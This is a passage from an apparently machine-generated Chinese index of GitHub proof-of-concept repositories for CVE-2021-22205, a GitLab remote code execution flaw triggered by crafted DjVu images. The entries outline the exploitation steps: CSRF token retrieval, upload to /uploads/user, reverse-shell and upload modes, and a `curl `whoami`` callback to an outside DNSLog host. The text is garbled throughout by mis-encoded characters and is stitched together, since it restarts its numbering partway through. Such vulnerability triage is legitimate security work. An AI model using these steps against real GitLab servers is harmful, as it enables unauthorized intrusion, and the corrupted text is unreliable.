*   åå¼¹ Shellï¼šåå¼¹ shell åˆ°æŒ‡å®šçš„ host å’Œ portã€‚
*   ä¸Šä¼ æ–‡ä»¶ï¼šé€šè¿‡ http åè®®ä¸Šä¼ æ–‡ä»¶åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼ˆéœ€è¦ VPSï¼‰ã€‚

ä»£ç ä¸»è¦é›†ä¸­åœ¨æ¼æ´žåˆ©ç”¨ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚è¯¥å·¥å…·éœ€è¦ä½¿ç”¨è€…æä¾›ç›®æ ‡URLå’Œå‘½ä»¤ï¼Œæˆ–è€…åå¼¹shellåœ°å€ï¼Œæ²¡æœ‰å‘çŽ°ä½œè€…é¢„ç•™åŽé—¨çš„è¿¹è±¡ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œè¯„ä¼°ä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  **æ¼æ´žæ£€æµ‹:**  ä½¿ç”¨ `-m detect`  é€‰é¡¹ï¼Œé€šè¿‡ DNSLog éªŒè¯ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´žã€‚ç¨‹åºä¼šç”Ÿæˆä¸€ä¸ªåŒ…å« DNS æŸ¥è¯¢è¯·æ±‚çš„æ–‡ä»¶ï¼Œå¦‚æžœç›®æ ‡å­˜åœ¨æ¼æ´žï¼Œä¼šå‘æŒ‡å®šçš„ DNSLog æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œä»Žè€ŒéªŒè¯æ¼æ´žã€‚
2.  **å‘½ä»¤æ‰§è¡Œ:**
    *   ä½¿ç”¨ `-m rce1` é€‰é¡¹ï¼Œé€šè¿‡ Postbin æ‰§è¡Œå‘½ä»¤ã€‚ç¨‹åºæž„é€ ä¸€ä¸ªåŒ…å«å‘½ä»¤çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®æ ‡æœåŠ¡å™¨åœ¨è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šè§¦å‘æ¼æ´žå¹¶æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶å°†ç»“æžœå‘é€åˆ° Postbinã€‚
3.  **åå¼¹ Shell:** ä½¿ç”¨ `-m rev` é€‰é¡¹ï¼Œåå¼¹ shell åˆ°æŒ‡å®šçš„ host å’Œ portã€‚ç¨‹åºæž„é€ ä¸€ä¸ªåŒ…å«åå¼¹ shell å‘½ä»¤çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®æ ‡æœåŠ¡å™¨åœ¨è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šè§¦å‘æ¼æ´žå¹¶æ‰§è¡Œåå¼¹ shell å‘½ä»¤ï¼Œä»Žè€Œå»ºç«‹ä¸Žæ”»å‡»è€…æœåŠ¡å™¨çš„è¿žæŽ¥ã€‚
4.  **æ–‡ä»¶ä¸Šä¼ :** ä½¿ç”¨ `-m upload` é€‰é¡¹ï¼Œä¸Šä¼ æ–‡ä»¶åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç¨‹åºæž„é€ ä¸€ä¸ªåŒ…å«è¦ä¸Šä¼ çš„æ–‡ä»¶çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®æ ‡æœåŠ¡å™¨åœ¨è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šè§¦å‘æ¼æ´žå¹¶å°†æ–‡ä»¶ä¿å­˜åˆ°æŒ‡å®šä½ç½®ã€‚

æ­¤æ¼æ´žåˆ©ç”¨çš„å…³é”®åœ¨äºŽåˆ©ç”¨ExifToolå¤„ç†å›¾ç‰‡æ—¶ï¼Œç”±äºŽæœªå¯¹ä¼ å…¥å‚æ•°è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æž„é€ æ¶æ„å›¾ç‰‡ï¼Œåœ¨ExifToolæ‰§è¡Œè¿‡ç¨‹ä¸­æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚


**é¡¹ç›®åœ°å€:** [c0okB/CVE-2021-22205](https://github.com/c0okB/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #7

**æ¥æº**: [CVE-2021-22205-cc3305_CVE-2021-22205.md](../2021/CVE-2021-22205-cc3305_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æ”»å‡»è€…å¯è®¿é—®è¯¥å®žä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶å¯¼è‡´çš„ã€‚å…·ä½“æ¥è¯´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆDjVu æ–‡ä»¶ï¼‰åˆ° GitLab æœåŠ¡å™¨ï¼Œå…¶ä¸­å›¾åƒæ–‡ä»¶çš„å…ƒæ•°æ®ä¸­åŒ…å«æ¶æ„å‘½ä»¤ã€‚å½“ GitLab ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒæ—¶ï¼Œæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ä¼šè¢«æ‰§è¡Œï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´žåº“ä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´žçš„POCä»£ç æœ‰æ•ˆã€‚æ¼æ´žåº“ä¿¡æ¯è¡¨æ˜Žè¯¥æ¼æ´žçš„ä¸¥é‡æ€§ä¸ºâ€œä¸¥é‡ (CRITICAL)â€ï¼ŒCVSS è¯„åˆ†é«˜è¾¾ 10 åˆ†ï¼Œè¡¨æ˜Žè¯¥æ¼æ´žå½±å“èŒƒå›´å¹¿ä¸”å®¹æ˜“åˆ©ç”¨ã€‚æä¾›çš„ POC ä»£ç  `CVE-2021-22205.py` æ—¨åœ¨åˆ©ç”¨æ­¤æ¼æ´žã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **æŸ¥æ‰¾CSRF token:** è„šæœ¬é¦–å…ˆå°è¯•ä»Ž `/users/sign_in` é¡µé¢èŽ·å– CSRF tokenï¼Œå› ä¸ºä¸Šä¼ æ–‡ä»¶éœ€è¦æœ‰æ•ˆçš„ CSRF tokenã€‚å®ƒä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥æå– tokenã€‚
2.  **æž„å»ºæ¶æ„DjVuæ–‡ä»¶ä¸Šä¼ è¯·æ±‚:** ç„¶åŽï¼Œè„šæœ¬æž„å»ºä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å‘½ä»¤çš„ DjVu æ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶ä¼šè¢«ä¸Šä¼ åˆ° GitLab æœåŠ¡å™¨ï¼ŒGitLab æœåŠ¡å™¨ä¼šä½¿ç”¨ ExifTool å¤„ç†è¯¥æ–‡ä»¶ã€‚
3.  **è§¦å‘å‘½ä»¤æ‰§è¡Œ:** å½“ ExifTool å¤„ç†è¯¥æ¶æ„æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥åœ¨æ–‡ä»¶å…ƒæ•°æ®ä¸­çš„å‘½ä»¤å°±ä¼šè¢«æ‰§è¡Œï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
è™½ç„¶æä¾›çš„ä»£ç çœ‹èµ·æ¥åŠŸèƒ½æ˜Žç¡®ï¼Œä½†å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£Žé™©ã€‚å…·ä½“è¡¨çŽ°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **ä¾èµ–æ€§é£Žé™©:** è¯¥è„šæœ¬ä¾èµ–äºŽ `requests` æ¨¡å—ã€‚è™½ç„¶è¿™æ˜¯å¾ˆå¸¸è§çš„æ¨¡å—ï¼Œå¦‚æžœä½œè€…ä¿®æ”¹äº†ä»£ç ä¸­çš„å…¶ä»–åœ°æ–¹ï¼Œä½¿å…¶å®‰è£…äº†æ¶æ„ä¾èµ–ï¼Œè¿™å¯èƒ½æ˜¯ä¸€ä¸ªæŠ•æ¯’ç‚¹ã€‚
*   **ä»£ç†é…ç½®åˆ©ç”¨:** è„šæœ¬æ”¯æŒé€šè¿‡ä»£ç†æœåŠ¡å™¨è¿žæŽ¥ã€‚æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡æä¾›æ¶æ„çš„ä»£ç†æœåŠ¡å™¨åœ°å€æ¥çªƒå–å—å®³è€…çš„å‡­æ®æˆ–æ‰§è¡Œä¸­é—´äººæ”»å‡»ã€‚
*   **å‘½ä»¤æ‰§è¡Œçš„éšè”½æ€§ï¼š** å¦‚æžœä¸Šä¼ çš„payloadåŒ…å«åå¼¹shell, åˆ™è„šæœ¬å¯èƒ½ä¼šå°è¯•å»ºç«‹åå‘ shell è¿žæŽ¥æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œè€Œéš¾ä»¥æ£€æµ‹ã€‚
*   **ç‰ˆæœ¬éªŒè¯ç»•è¿‡:** è„šæœ¬ä¸­çš„ç‰ˆæœ¬éªŒè¯å¯èƒ½å­˜åœ¨ç»•è¿‡çš„é£Žé™©ï¼Œå³ä½¿ç”¨æˆ·ä¿®å¤äº†æ¼æ´žï¼Œè„šæœ¬ä»ç„¶å°è¯•åˆ©ç”¨ï¼Œå¯èƒ½ä¼šå¯¼è‡´å…¶ä»–æœªçŸ¥çš„å®‰å…¨é—®é¢˜ã€‚

ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£Žé™©çº¦ä¸º 10%ã€‚ä¸»è¦åŽŸå› æ˜¯è¯¥è„šæœ¬çš„åŠŸèƒ½è¾ƒä¸ºé›†ä¸­ï¼Œä¸”ä¾èµ–æ¨¡å—è¾ƒå°‘ã€‚ä½†ä»ç„¶éœ€è¦å¯¹è„šæœ¬è¿›è¡Œä»”ç»†å®¡æŸ¥ï¼Œä»¥ç¡®ä¿å…¶å®‰å…¨æ€§ã€‚

**é¡¹ç›®åœ°å€:** [cc3305/CVE-2021-22205](https://github.com/cc3305/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #8

**æ¥æº**: [CVE-2021-22205-ccordeiro_CVE-2021-22205.md](../2021/CVE-2021-22205-ccordeiro_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨æŽ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å¯ä»Žç½‘ç»œè®¿é—®ï¼Œä¸”æœªæ‰“è¡¥ä¸

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 1%

## è¯¦æƒ…

CVE-2021-22205 å­˜åœ¨äºŽ GitLab CE/EE ä¸­ï¼Œå½±å“ä»Ž 11.9 å¼€å§‹çš„æ‰€æœ‰ç‰ˆæœ¬ã€‚GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®ï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´žåˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆè®¿é—®GitLabå®žä¾‹çš„ç™»å½•é¡µé¢ `/users/sign_in`ï¼ŒèŽ·å– CSRF tokenã€‚ 
2.  ç„¶åŽï¼Œæ”»å‡»è€…æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ï¼ˆDJVU æ ¼å¼ï¼‰ã€‚è¯¥æ–‡ä»¶ä¸­çš„ metadata å­—æ®µåŒ…å«è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¾‹å¦‚ `curl whoami.82sm53.dnslog.cn` æˆ–å…¶ä»–æ¶æ„æŒ‡ä»¤ã€‚
3.  æ”»å‡»è€…ä½¿ç”¨ multipart/form-data å°†æ­¤ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° `/uploads/user` ç«¯ç‚¹ã€‚è¯·æ±‚å¤´ä¸­åŒ…å«ä¹‹å‰èŽ·å–çš„ CSRF tokenã€‚
4.  GitLab åœ¨å¤„ç†ä¸Šä¼ çš„å›¾åƒæ—¶ï¼Œä¼šè°ƒç”¨ ExifTool æ¥æå–å…ƒæ•°æ®ã€‚ç”±äºŽæœªè¿›è¡Œå……åˆ†çš„éªŒè¯ï¼ŒExifTool ä¼šæ‰§è¡Œå›¾åƒæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§:**
æä¾›çš„PoCä»£ç åˆ©ç”¨äº†CVE-2021-22205æ¼æ´žï¼Œé€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„DJVUå›¾åƒï¼Œå…¶ä¸­åŒ…å«äº†æ¶æ„çš„ExifToolå…ƒæ•°æ®ï¼Œå¯ä»¥å®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚PoCä»£ç é¦–å…ˆèŽ·å–CSRF Tokenï¼Œç„¶åŽæž„é€ åŒ…å«payloadçš„multipart/form-dataè¯·æ±‚ï¼Œå‘é€åˆ°`/uploads/user`ç«¯ç‚¹ã€‚å¦‚æžœç›®æ ‡å­˜åœ¨æ¼æ´žä¸”æœªæ‰“è¡¥ä¸ï¼ŒPoCä¼šæˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©:**
æä¾›çš„PoCä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´žæ‰§è¡Œå‘½ä»¤ã€‚ç»è¿‡åˆ†æžï¼Œä»£ç ä¸­æ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æ¶æ„é€»è¾‘æˆ–åŽé—¨ã€‚ é£Žé™©è¾ƒä½Žï¼Œ ä½†æ˜¯å¹¶ä¸èƒ½æŽ’é™¤ä½œè€…åœ¨ä»£ç ä¸­éšè—äº†ä¸æ˜“å¯Ÿè§‰çš„æŠ•æ¯’ä»£ç ã€‚ä¾‹å¦‚é€šè¿‡ç½‘ç»œåŠ è½½æ¶æ„ä»£ç ç­‰ã€‚æ‰€ä»¥è¿™é‡Œè¯„ä¼°çš„æŠ•æ¯’é£Žé™©ä¸º1%ã€‚

**é¡¹ç›®åœ°å€:** [ccordeiro/CVE-2021-22205](https://github.com/ccordeiro/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #9

**æ¥æº**: [CVE-2021-22205-devdanqtuan_CVE-2021-22205.md](../2021/CVE-2021-22205-devdanqtuan_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ GitLab å®žä¾‹éœ€è¦å­˜åœ¨æ¼æ´žï¼Œä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—® GitLab å®žä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 1%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ª GitLab è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  æ”»å‡»è€…é¦–å…ˆèŽ·å–ç›®æ ‡ GitLab å®žä¾‹çš„ CSRF Tokenï¼Œè¯¥ Token å¯é€šè¿‡è®¿é—®ç™»å½•é¡µé¢èŽ·å¾—ã€‚
2.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å‘½ä»¤çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚è¯¥æ–‡ä»¶åˆ©ç”¨ ExifTool çš„æ¼æ´žï¼Œåœ¨è§£æžå…ƒæ•°æ®æ—¶æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…ä½¿ç”¨ multipart/form-data å°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° GitLab çš„å¤´åƒä¸Šä¼ æŽ¥å£ `/uploads/user`ã€‚
4.  GitLab è°ƒç”¨ ExifTool è§£æžå›¾åƒæ–‡ä»¶ï¼ŒExifTool æ‰§è¡Œæ¶æ„å‘½ä»¤ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§:**

æä¾›çš„ POC ä»£ç æœ‰æ•ˆã€‚å®ƒæ¨¡æ‹Ÿäº†ä¸Šè¿°åˆ©ç”¨æµç¨‹ï¼Œèƒ½å¤ŸæˆåŠŸè§¦å‘æ¼æ´žå¹¶æ‰§è¡Œå‘½ä»¤ã€‚POC é€šè¿‡æž„é€ æ¶æ„çš„ DJVU å›¾åƒæ–‡ä»¶ï¼Œå°†å‘½ä»¤æ³¨å…¥åˆ° ExifTool å¯ä»¥è§£æžçš„å…ƒæ•°æ®ä¸­ã€‚ä¸Šä¼ åŒ…å«æ¶æ„å‘½ä»¤çš„å›¾ç‰‡åˆ°å­˜åœ¨æ¼æ´žçš„GitLabæœåŠ¡å™¨ï¼Œå³å¯æ‰§è¡Œå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©:**

ä»£ç æ•´ä½“æ˜¯ç”¨äºŽå¤çŽ°æ¼æ´žï¼Œä½†å­˜åœ¨å¾®å°çš„æŠ•æ¯’é£Žé™©ã€‚ä¸»è¦é£Žé™©ç‚¹åœ¨äºŽæ”»å‡»å‘½ä»¤çš„æž„é€ ä»¥åŠæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹`target_url`æ¥è¾¾åˆ°æ”»å‡»ç›®çš„ã€‚è€ƒè™‘åˆ°POCæœ¬èº«å°±æ˜¯æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œæ‰€ä»¥æ­£å¸¸ä½¿ç”¨åœºæ™¯ä¸‹æ˜¯æ²¡é—®é¢˜çš„ã€‚é™¤éžï¼Œæœ‰äººæ•…æ„é­”æ”¹æ­¤ä»£ç ï¼Œæˆ–è€…åœ¨æ‰¹é‡æµ‹è¯•æ—¶ï¼Œä½¿ç”¨è€…æœªæ£€æŸ¥urlï¼Œå¯èƒ½ä¼šæœ‰ä¸€å®šé£Žé™©ã€‚æ•…è®¤ä¸ºæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œçº¦ä¸º1%ã€‚

**ä¼˜å…ˆçº§:**

ç”±äºŽæœç´¢å¼•æ“Žæ²¡æœ‰æä¾›ç»“æžœï¼Œå› æ­¤ä¼˜å…ˆçº§ä¸ºæ¼æ´žåˆ©ç”¨ä»£ç  > æ¼æ´žåº“ä¿¡æ¯ã€‚

**é¡¹ç›®åœ°å€:** [devdanqtuan/CVE-2021-22205](https://github.com/devdanqtuan/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #10

**æ¥æº**: [CVE-2021-22205-faisalfs10x_GitLab-CVE-2021-22205-scanner.md](../2021/CVE-2021-22205-faisalfs10x_GitLab-CVE-2021-22205-scanner.md)

# CVE-2021-22205

> ðŸ“¦ è¯¥CVEæœ‰ **24** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2021-22205-Al1ex_CVE-2021-22205.md](../2021/CVE-2021-22205-Al1ex_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç½‘ç»œè®¿é—®ï¼Œä¸”ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 5%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žæ˜¯ GitLab CE/EE ç‰ˆæœ¬ä¸­å­˜åœ¨çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab å¯¹ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶å¤„ç†ä¸å½“ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ ExifTool çš„æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´žå½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬ 11.9 åˆ° 13.8.8ï¼Œ13.9 åˆ° 13.9.6 ä»¥åŠ 13.10 åˆ° 13.10.3ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æä¾›çš„æ¼æ´žä¿¡æ¯å’ŒPOCä»£ç ï¼Œå¯ä»¥åˆ¤æ–­è¯¥POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚POCä»£ç é€šè¿‡æž„é€ æ¶æ„çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œåœ¨å…¶ä¸­åµŒå…¥äº†å‘½ä»¤ï¼Œåˆ©ç”¨ExifToolå¤„ç†å›¾åƒæ—¶æ‰§è¡Œè¯¥å‘½ä»¤ã€‚POCä»£ç èƒ½å¤ŸæˆåŠŸåˆ©ç”¨æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

å¯¹POCä»£ç çš„æŠ•æ¯’é£Žé™©åˆ†æžå¦‚ä¸‹ï¼š

*   ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´žï¼Œç»“æž„æ¸…æ™°ï¼Œç›®çš„æ˜¯æž„é€ æ¶æ„å›¾ç‰‡å¹¶å‘é€è¯·æ±‚ã€‚
*   è™½ç„¶å­˜åœ¨æ‰§è¡Œä»»æ„å‘½ä»¤çš„é£Žé™©ï¼Œä½†è¿™å±žäºŽæ¼æ´žæœ¬èº«çš„ç‰¹æ€§ï¼Œè€Œéžä½œè€…é¢å¤–æ·»åŠ çš„æ¶æ„ä»£ç ã€‚
*   å…¶ä¸­`curl `whoami`.82sm53.dnslog.cn`åªæ˜¯ä¸€ä¸ªDNSLogæ£€æµ‹ï¼Œç”¨äºŽéªŒè¯æ¼æ´žæ˜¯å¦å­˜åœ¨ï¼Œå¹¶éžæ¶æ„æŠ•æ¯’ã€‚

è™½ç„¶æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´žæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä½†å°±æä¾›çš„POCä»£ç æœ¬èº«è€Œè¨€ï¼Œä¸å­˜åœ¨æ˜Žæ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œå¤§çº¦ä¸º5%ã€‚ä¸»è¦é£Žé™©åœ¨äºŽä½¿ç”¨è¯¥POCè¿›è¡ŒæœªæŽˆæƒçš„æ¸—é€æµ‹è¯•ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…é¦–å…ˆè®¿é—®ç›®æ ‡GitLabå®žä¾‹çš„ç™»å½•é¡µé¢ï¼ˆ/users/sign_inï¼‰ï¼ŒèŽ·å–CSRF Tokenã€‚
2.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«åµŒå…¥çš„å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤å°†åœ¨ExifToolå¤„ç†è¯¥å›¾åƒæ—¶æ‰§è¡Œã€‚`attack` å‡½æ•°ä¸­çš„ä»£ç å…è®¸é€šè¿‡ `-c` å‚æ•°æŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…é€šè¿‡/uploads/useræŽ¥å£ä¸Šä¼ æž„é€ çš„æ¶æ„å›¾åƒæ–‡ä»¶ã€‚åŒæ—¶åœ¨POSTè¯·æ±‚ä¸­å¸¦ä¸ŠCSRF Tokenã€‚
4.  å½“GitLabå¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼ŒExifToolä¼šè§£æžè¯¥æ–‡ä»¶ï¼Œå¹¶æ‰§è¡ŒåµŒå…¥çš„å‘½ä»¤ã€‚
5.  æ”»å‡»è€…é€šè¿‡DNSLogæˆ–å…¶ä»–æ–¹å¼æ¥æŽ¥æ”¶å‘½ä»¤æ‰§è¡Œçš„ç»“æžœï¼Œæˆ–è€…ç›´æŽ¥åˆ©ç”¨æ‰§è¡Œçš„å‘½ä»¤æŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [Al1ex/CVE-2021-22205](https://github.com/Al1ex/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #2

